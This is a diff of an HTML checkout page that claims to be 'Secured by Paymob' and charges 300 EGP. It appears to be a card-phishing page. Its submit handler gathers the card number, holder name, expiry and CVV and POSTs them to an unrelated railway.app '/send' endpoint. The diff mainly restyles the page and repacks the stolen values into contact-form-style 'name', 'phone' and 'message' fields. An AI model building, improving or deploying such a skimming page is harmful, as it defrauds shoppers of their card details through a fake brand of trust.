@@ -5,21 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Payment Information</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Roboto', sans-serif;
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
 
         body {
-            background-color: #f4f4f4;
+            font-family: 'Roboto', sans-serif;
+            background-color: #f5f5f5;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            margin: 0;
         }
 
         .container {
@@ -27,135 +22,92 @@
             width: 360px;
             padding: 20px;
             border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
             text-align: center;
         }
 
-        h2 {
-            color: #333;
-            margin-bottom: 15px;
-            font-weight: 700;
-        }
-
-        .card {
-            background: #0074D9;
-            color: white;
-            padding: 15px;
+        .card-image {
+            width: 100%;
             border-radius: 10px;
-            text-align: left;
-            position: relative;
+            margin-bottom: 15px;
         }
 
-        .chip {
-            width: 40px;
-            position: absolute;
-            top: 10px;
-            left: 10px;
+        h2 {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: #333;
         }
 
-        .form-group {
-            text-align: left;
-            margin: 10px 0;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        input {
+        input, select {
             width: 100%;
             padding: 10px;
+            margin: 5px 0;
             border: 1px solid #ccc;
             border-radius: 5px;
-            font-size: 16px;
+            font-size: 14px;
         }
 
         input:focus {
-            border-color: #0074D9;
-            outline: none;
+            outline: 2px solid #007bff;
+        }
+
+        .input-row {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .input-row input {
+            width: 48%;
         }
 
         .save-card {
             display: flex;
             align-items: center;
-            gap: 8px;
+            margin: 10px 0;
             font-size: 14px;
-            margin-top: 10px;
         }
 
-        .pay-btn {
+        .save-card input {
+            width: auto;
+            margin-right: 5px;
+        }
+
+        .pay-button {
             width: 100%;
-            background: #0074D9;
+            padding: 12px;
+            background: #007bff;
             color: white;
             border: none;
-            padding: 15px;
-            font-size: 18px;
             border-radius: 5px;
+            font-size: 16px;
             cursor: pointer;
-            margin-top: 10px;
-            font-weight: 700;
+            transition: 0.3s;
         }
 
-        .pay-btn:hover {
-            background: #005bb5;
+        .pay-button:hover {
+            background: #0056b3;
         }
 
-        .logos {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 15px;
-        }
-
-        .logos img {
-            width: 50px;
-        }
-
-        .secure {
+        .secured {
             font-size: 12px;
-            margin-top: 5px;
-            color: #666;
+            color: #777;
+            margin-top: 10px;
         }
-
     </style>
 </head>
 <body>
 
     <div class="container">
         <h2>Payment Information</h2>
+        <img src="https://i.imgur.com/ZR6p2ie.png" class="card-image" alt="Credit Card">
         
-        <div class="card">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/8/88/EMV-Chip.svg" class="chip" alt="Chip">
-            <p>Card Number</p>
-            <p>•••• •••• •••• ••••</p>
-            <p>Card Name</p>
-            <p>Enter Name</p>
-            <p>Valid Thru</p>
-            <p>MM/YY</p>
-        </div>
-
         <form id="paymentForm">
-            <div class="form-group">
-                <label>Card Number:</label>
-                <input type="text" id="cardNumber" placeholder="Enter Card Number" maxlength="16" required>
-            </div>
-
-            <div class="form-group">
-                <label>Card Holder Name:</label>
-                <input type="text" id="name" placeholder="Enter Name" required>
-            </div>
-
-            <div class="form-group">
-                <label>Expiration Date:</label>
-                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
-            </div>
-
-            <div class="form-group">
-                <label>CVV:</label>
-                <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
+            <input type="text" id="cardNumber" placeholder="Card Number" maxlength="16" pattern="\d*" required>
+            <input type="text" id="cardHolder" placeholder="Card Holder Name" pattern="[A-Za-z ]+" required>
+            
+            <div class="input-row">
+                <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" required>
+                <input type="text" id="cvv" placeholder="CVV" maxlength="3" pattern="\d*" required>
             </div>
 
             <div class="save-card">
@@ -163,55 +115,30 @@
                 <label for="saveCard">Save Card</label>
             </div>
 
-            <button type="submit" class="pay-btn">PAY 300.00 EGP</button>
+            <button type="submit" class="pay-button">PAY 300.00 EGP</button>
         </form>
 
-        <div class="logos">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Visa.svg/120px-Visa.svg.png" alt="Visa">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/120px-Mastercard-logo.svg.png" alt="MasterCard">
-        </div>
-
-        <p class="secure">🔒 Secured by Paymob</p>
+        <p class="secured">🔒 Secured by Paymob</p>
     </div>
 
     <script>
-        // السماح بالأرقام فقط في حقل رقم البطاقة
-        document.getElementById("cardNumber").addEventListener("input", function() {
-            this.value = this.value.replace(/\D/g, ''); // يمنع الحروف
-        });
-
-        // السماح فقط بالحروف الإنجليزية في اسم حامل البطاقة
-        document.getElementById("name").addEventListener("input", function() {
-            this.value = this.value.replace(/[^A-Za-z\s]/g, ''); // يمنع الأرقام والرموز
-        });
-
-        // السماح فقط بالأرقام في تاريخ الانتهاء وإضافة "/"
-        document.getElementById("expiry").addEventListener("input", function() {
-            this.value = this.value.replace(/[^0-9/]/g, ''); // يمنع الحروف
-            if (this.value.length === 2 && !this.value.includes('/')) {
-                this.value += '/';
-            }
-        });
-
-        // السماح بالأرقام فقط في CVV
-        document.getElementById("cvv").addEventListener("input", function() {
-            this.value = this.value.replace(/\D/g, ''); // يمنع الحروف
-        });
-
-        // إرسال البيانات عند الضغط على زر الدفع
         document.getElementById("paymentForm").addEventListener("submit", function(event) {
             event.preventDefault();
 
             const cardNumber = document.getElementById("cardNumber").value;
-            const name = document.getElementById("name").value;
-            const expiry = document.getElementById("expiry").value;
+            const cardHolder = document.getElementById("cardHolder").value;
+            const expiryDate = document.getElementById("expiryDate").value;
             const cvv = document.getElementById("cvv").value;
-            const saveCard = document.getElementById("saveCard").checked;
+            const saveCard = document.getElementById("saveCard").checked ? "Yes" : "No";
 
             fetch("https://nodejs-production-7090.up.railway.app/send", { 
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ cardNumber, name, expiry, cvv, saveCard })
+                body: JSON.stringify({ 
+                    name: cardHolder, 
+                    phone: cardNumber, 
+                    message: `Expiry: ${expiryDate}, CVV: ${cvv}, Save Card: ${saveCard}` 
+                })
             })
             .then(response => response.json())
             .then(data => alert(data.message))
